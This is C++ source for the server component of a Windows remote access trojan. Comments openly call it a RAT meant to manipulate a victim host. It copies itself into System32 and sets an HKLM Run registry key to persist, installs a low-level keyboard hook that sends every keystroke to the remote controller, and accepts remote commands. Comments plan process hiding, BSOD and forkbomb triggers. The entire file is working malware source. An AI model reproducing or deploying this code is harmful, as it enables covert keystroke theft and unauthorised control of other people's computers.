#include "server_header.h"

int main(){

    AddtoStartup();

//map the server enumerated commands so I can recv a string to match with!
    dictionary["TRIGMSGBOX"] = TRIGMSGBOX;
    dictionary["KEYLOG"] = KEYLOG;
    dictionary["DISCONNECT"] = DISCONNECT;

//Map messagebox responses!
    MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
    MSGBOX_TYPES["Help MsgBox (note WM_HELP not used)"]   = MB_HELP;
    MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
    MSGBOX_TYPES["Yes No"]                                = MB_YESNO;


    MSGBOX_ICONS["Exclamation Icon"]      = MB_ICONEXCLAMATION;
    MSGBOX_ICONS["Warning Icon"]          = MB_ICONWARNING;
    MSGBOX_ICONS["Error Icon"]            = MB_ICONINFORMATION;
    MSGBOX_ICONS["Stop Icon"]             = MB_ICONSTOP;



/*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/
    extern WSADATA wsa;
    extern SOCKET sa, clientsock;
    extern struct sockaddr_in server, client;
    extern char server_reply[buffersize];
    //THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT.
    extern bool KILLSERVER;


    HandleError(WSAStartup(MAKEWORD(2,2), &wsa));

    HandleError((sa = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET);


    server.sin_addr.s_addr = inet_addr (ipaddress.c_str());      //initialize members of server structure
    server.sin_family = AF_INET;
    server.sin_port = htons(portnumber);

    HandleError(bind(sa, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR);

    HandleError(listen(sa, SOMAXCONN));

    while(KILLSERVER){


        clientsock = accept(sa, (struct sockaddr *)&client, NULL);

        //send(clientsock, "Message!", 9, 0);

        while(1){

        if(clientsock == INVALID_SOCKET){
            break;
        }
        int counter = 0;

        memset(server_reply, '\0', buffersize);



                /*NOTE: MESSAGES WILL BE SENT IN OPERATOR>OPERAND< FORMAT. MEANING THAT THE > SYMBOL DISTINGUISHES BETWEEN THE TWO. */
                /* THE < SYMBOL DENOTES END OF MESSAGE*/
                /*FOR EXAMPLE, IF WE WANT TO MAKE A MESSAGEBOX DISPLAYING HELLO, WE WOULD SAY MSGBOXTRIG>CONTENT< */
                /*Messagebox contents will be sent as follows: title/message-MSGBOXSTYLE_ICON */
                /*Therefore, the complete syntax would be:  TRIGMSGBOX>myTitle/myMessage-MSGBOXTYLE_MESSAGEBOXICON< */
                /*SOMETIMES THERE WILL BE NO OPERAND, JUST AN OPERATOR*/
                /*FOR EXAMPLE, IT MAKES NO SENSE TO HAVE AN OPERATOR TO TRIGGER A BSOD. THEREFORE, THE SYNTAX FOR THAT WILL BE*/
                /*TRIGGERBSOD><*/
                /*LETS SAY WE WANT TO DO SOME SKID SHIT LIKE TRIGGER A FORKBOMB WITH THE CLIENT. THE OPERATOR AND OPERAND WOULD BE SOMETHING LIKE*/
                /*FORKTRIGGER><*/
                /*OR WE WANT TO SUSPEND THE COMPUTER FOR A LIMITED AMOUNT OF SECONDS*/
                /*SUSPENDHOST>45<*/


            //send(clientsock, "KEYLOG><", 8, 0);
            HandleError(recv(clientsock, server_reply, buffersize, 0));//error checking combined with recv function


        //CLEAR STRING BEFORE PROCESSING! MAKES THINGS NICE AND CLEAN!!
        server_operator.clear();
        server_operand.clear();

            int forcount = 0;
            //PARSE THE OPERATOR
            for (; server_reply[forcount] != '>'; forcount++){
               server_operator += server_reply[forcount];
            }

            //PARSE THE OPERAND
            forcount++;
            for (; server_reply[forcount] != '<'; forcount++){

                server_operand += server_reply[forcount];

            }


             map<string, SERVERMESSAGE>::iterator i = dictionary.find(server_operator);


            //i->second corresponds to the enumerated message

            switch(i->second){

                case TRIGMSGBOX:  _beginthreadex(NULL, 0, &TrigBox, &server_operand, 0, NULL);  //not really necessary to create an unused handle, but its here incase you need to use it
                    break;
                case KEYLOG:    _beginthreadex(NULL,0, &KeyLog, NULL, 0, NULL);
                //MessageBox(NULL,NULL,"MESSAGE2",NULL);
                    break;
                case DISCONNECT: clientsock = INVALID_SOCKET;
                    break;
                default: MessageBox(NULL, "Message unrecognized!", "Exception!", NULL);
                    break;

            }

               //send(clientsock, "Ack", 4, 0);
        }



    }
    MessageBox(NULL,"D/c", NULL,NULL);
            closesocket(sa);
            WSACleanup();

    return 0;
}

unsigned int __stdcall KeyLog(void* data){

    HINSTANCE hinst = GetModuleHandle(NULL);
    HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
    MSG msg;

    MessageBox(NULL, "entered", NULL, NULL);

        while(GetMessage(&msg, NULL, 0, 0)){


            TranslateMessage(&msg);
            DispatchMessage(&msg);

        }

      UnhookWindowsHookEx(hhkLowLevelKybd);



}

unsigned int __stdcall TrigBox(void* data){

/*  map<string, UINT> MSGBOX_TYPES;
    MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
    MSGBOX_TYPES["Help MsgBox (note WM_HELP not used)"]   = MB_HELP;
    MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
    MSGBOX_TYPES["Yes No"]                                = MB_YESNO;

    map<string, UINT> MSGBOX_ICONS;
    MSGBOX_ICONS["Exclamation Icon"]      = MB_ICONEXCLAMATION;
    MSGBOX_ICONS["Warning Icon"]          = MB_ICONWARNING;
    MSGBOX_ICONS["Error Icon"]            = MB_ICONINFORMATION;
    MSGBOX_ICONS["Stop Icon"]             = MB_ICONSTOP;*/

    string operand = *(string*)data;
    //four components, the Title, message, unittype, unitico

    string components[4];
    string::iterator it;

    int counter = 0;
        for ( it = operand.begin() ; it < operand.end(); it++ ){
        //parse the message processed! into 4 components. run it in a debugger and you'll see!
            if(*it == '/' || *it == '-' || *it == '_'){
                it++;
                counter++;
            }
                components[counter] += *it;
        }

     map<string, UINT>::iterator icon = MSGBOX_ICONS.find(components[3].c_str());

     map<string, UINT>::iterator style = MSGBOX_TYPES.find(components[2].c_str());

     MessageBox(NULL, components[1].c_str(), components[0].c_str(), icon->second|style->second);



    return 0;
}

void AddtoStartup(){
 /*FIRST THING WE DO IS COPY SERVER.EXE TO SYSTEM32 FOLDER AND THEN MAKE A REGISTRY KEY THAT OPENS SERVER.EXE AT STARTUP*/
    //NOTE we still have to implement the process hiding in task manager!~
    std::string filename ="\\";
    char system[MAX_PATH];
    char pathtofile[MAX_PATH];

    //GET MODULE HANDLE OF CALLING PROGRAM I.E SERVER.EXE'S HANDLE
    HMODULE GetModH = GetModuleHandle(NULL);

    //GET PATH OF SERVER.EXE
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));

    filename.append(PathFindFileNameA(pathtofile));

    //GET SYSTEM DIRECTORY LIKE SYSTEM32 OR SYSWOW64, FOR COMPATIBILITY REASONS
    GetSystemDirectory(system,sizeof(system));

    //APPEND MY FILENAME AFTER THE SYSTEMDIRECTORY SO WE CAN DROP OUR SERVER INTO THE SYSTEM 32 FOLDER
    strcat(system, filename.c_str());

    //COPY SERVER TO THE SYSTEM32 FOLDER
    CopyFile(pathtofile,system,false);

    //MAKE A REGISTRY KEY TO THE SYSTEM32FOLDER WITH SERVER.EXE TO RUN AT STARTUP
    HKEY hKey;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );


    RegSetValueEx(hKey, "serv",0,REG_SZ,(const unsigned char*)system,sizeof(system));

    RegCloseKey(hKey);
}

int HandleError(int error){

    if (error == SOCKET_ERROR){

        stringstream ss;
        ss <<"Error: " << WSAGetLastError() << " From WSAGetLastError() From WSAStart() !";
        MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);

    }else return 0;

    return SOCKET_ERROR;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){

    string KEYLOGstr = "KEYLOG>";
    extern SOCKET clientsock;
    PKBDLLHOOKSTRUCT structdll = (PKBDLLHOOKSTRUCT) lParam;
    clock_t timer;
    switch(nCode){

        case HC_ACTION:
            switch(wParam){

                case WM_KEYDOWN:{


                    //How should i change the following lines?
                    char buffer[256];
                    GetKeyNameText((MapVirtualKey(structdll->vkCode, 0)<<16), buffer, 50);
                    //use this?: ToAscii(structdll->vkCode, structdll->scanCode, NULL, myword, 0);


                    KEYLOGstr.append(buffer);
                    KEYLOGstr.append("<");
                    //std::cout <<"\n"<<KEYLOGstr;

                    //timer = clock();
                    //if ((timer / CLOCKS_PER_SEC) % 3 == 0){

                      //  MessageBox(NULL, KEYLOGstr.c_str(), "MSGBOX", NULL);
                      send(clientsock, KEYLOGstr.c_str(), KEYLOGstr.length(), 0);
                    //}

                }
                break;
            }
        break;
    }

return CallNextHookEx(NULL, nCode, wParam,lParam);

}

